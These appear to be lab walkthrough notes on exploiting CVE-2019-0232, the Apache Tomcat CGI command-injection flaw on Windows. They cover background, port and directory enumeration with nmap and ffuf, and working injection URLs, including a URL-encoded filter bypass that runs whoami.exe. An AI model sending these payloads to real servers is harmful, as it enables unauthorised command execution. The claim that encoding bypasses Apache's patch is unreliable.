## Attacking Tomcat CGI (CVE-2019-0232)
### Overview  
CVE-2019-0232 is a critical remote code execution vulnerability in Apache Tomcat for Windows systems with the `enableCmdLineArguments` flag enabled. The flaw lies in how the CGI Servlet parses query strings and improperly passes unsanitized arguments to command-line CGI scripts. This results in unauthenticated command injection and arbitrary OS command execution.

Affected versions:

- Apache Tomcat 9.0.0.M1 to 9.0.17
- Apache Tomcat 8.5.0 to 8.5.39
- Apache Tomcat 7.0.0 to 7.0.93
### CGI Servlet Basics  

The CGI Servlet acts as middleware between Tomcat and external applications like `.bat`, `.cmd`, or `.pl` scripts. It supports dynamic web content execution using environment variables or command-line arguments (when `enableCmdLineArguments=true`).

Advantages of CGI:

- Simple to implement    
- Supports many programming languages
- Encourages reuse of legacy scripts    

Disadvantages of CGI:

- One process per request (performance hit)
- No memory caching between requests
- High CPU usage on large-scale deployments
### Understanding `enableCmdLineArguments`

When enabled, parameters from the query string are interpreted as command-line arguments and passed directly to the invoked script. For example:  
`http://example.com/cgi-bin/search.cgi?action=author&query=fitzgerald`  
In this case, the script gets arguments `action=author` and `query=fitzgerald`.

However, on Windows systems, an attacker can abuse this feature by injecting OS commands via special characters like `&`:  
Example:  
`http://victim/cgi-bin/script.bat?&dir`
### Initial Enumeration  

Use Nmap to identify open ports and web services.

```
nmap -p- -sC -Pn 10.129.204.227 --open
```

Nmap Output Summary:

- Port 8080: Apache Tomcat/9.0.17 (vulnerable)    
- Port 8009: AJP13 (Apache JServ Protocol)
- Multiple Windows RPC/SMB ports open (135, 139, 445)
- WinRM enabled on port 5985 and 47001
### Finding CGI Scripts  

Use `ffuf` for content discovery against known CGI directories using `.bat` and `.cmd` extensions.

Attempt 1 (Failed):

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

Attempt 2 (Successful):

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Result:

```
[Status: 200] - welcome.bat
```

Visit: `http://10.129.204.227:8080/cgi/welcome.bat`  
Returns message:  
`Welcome to CGI, this section is not functional yet. Please return to home page.`
### Exploitation â€“ Command Injection via Query String  

Triggering command execution:

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

Only basic commands like `dir` work at first. Others like `whoami` may silently fail due to environmental restrictions.

Enumerate environment variables:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Useful output:

- `COMSPEC=C:\Windows\system32\cmd.exe`
- `SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat`
- `SystemRoot=C:\Windows`
- `PATH` is unset, so full paths must be used
### Bypassing Input Filtering with URL Encoding  

Apache patched Tomcat to block dangerous characters, but the filter can be bypassed by URL-encoding the payload.

Command:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

Explanation:

- `&` = `%26`    
- `\` = `%5C`
- `:` = `%3A`

If successful, this will return the output of `whoami.exe` executed via the CGI script.
# Tags
> #Exploitation #Application-Exploitation #Tomcat 